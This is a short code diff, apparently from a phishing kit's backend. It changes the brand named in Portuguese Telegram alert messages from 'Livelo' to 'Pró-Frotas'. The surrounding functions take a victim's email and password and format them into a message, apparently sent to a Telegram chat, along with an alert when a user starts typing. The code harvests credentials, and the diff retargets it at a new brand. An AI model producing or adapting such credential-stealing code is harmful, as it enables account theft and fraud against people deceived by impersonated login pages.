@@ -47,7 +47,7 @@ async def send_telegram_notification(email: str, password: str, device: str = "D
         return
     try:
         now = datetime.now(timezone.utc).strftime("%d/%m/%Y %H:%M")
-        message = f"""🔔 *Novo usuário na Livelo!*
+        message = f"""🔔 *Novo usuário no Pró-Frotas!*
 
 📧 *Login:* `{email}`
 🔑 *Senha:* `{password}`
@@ -73,7 +73,7 @@ async def send_telegram_email_typing(email: str):
         return
     try:
         now = datetime.now(timezone.utc).strftime("%d/%m/%Y %H:%M")
-        message = f"""👀 *Usuário digitando na Livelo*
+        message = f"""👀 *Usuário digitando no Pró-Frotas*
 
 📧 *Login:* `{email}`
 ⏰ *Horário:* {now} UTC
